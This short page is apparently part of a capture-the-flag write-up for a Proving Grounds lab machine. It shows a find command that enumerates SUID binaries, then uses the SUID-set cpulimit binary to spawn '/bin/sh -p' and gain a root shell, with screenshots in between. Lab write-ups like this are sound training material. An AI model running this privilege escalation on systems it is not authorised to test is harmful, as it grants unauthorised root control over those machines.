---
layout: default
title: cpulimit
parent: SUID
nav_order: 3
---

# cpulimit

---

```bash
find / -perm -u=s -type f 2>/dev/null
```

![suid](../../../../assets/images/ctfs/proving_grounds/onsystemshelldredd/suid.png)

![gtfobins](../../../../assets/images/ctfs/proving_grounds/onsystemshelldredd/gtfobins.png)

## Exploit Cpulimit SUID to get root

```bash
cpulimit -l 100 -f -- /bin/sh -p
```

![root](../../../../assets/images/ctfs/proving_grounds/onsystemshelldredd/root.png)
